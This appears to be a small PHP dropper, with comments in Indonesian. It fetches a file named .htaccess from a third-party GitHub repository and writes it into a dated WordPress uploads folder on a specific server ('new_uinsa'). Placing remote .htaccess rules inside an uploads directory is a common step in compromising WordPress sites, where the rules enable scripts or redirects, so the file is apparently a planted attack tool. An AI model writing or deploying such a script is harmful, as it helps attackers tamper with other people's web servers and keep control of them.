<?php

$url = "https://raw.githubusercontent.com/69dev-id/hc/refs/heads/main/.htaccess";
$destination = "/var/www/new_uinsa/wp-content/uploads/2022/07/.htaccess";

// Mengambil konten dari URL
$content = file_get_contents($url);

if ($content !== false) {
    // Menyimpan konten ke file tujuan
    if (file_put_contents($destination, $content)) {
        echo "Berhasil! File telah diunduh ke: " . $destination;
    } else {
        echo "Gagal menyimpan file. Pastikan permission folder sudah benar.";
    }
} else {
    echo "Gagal mengambil file dari URL.";
}

?>
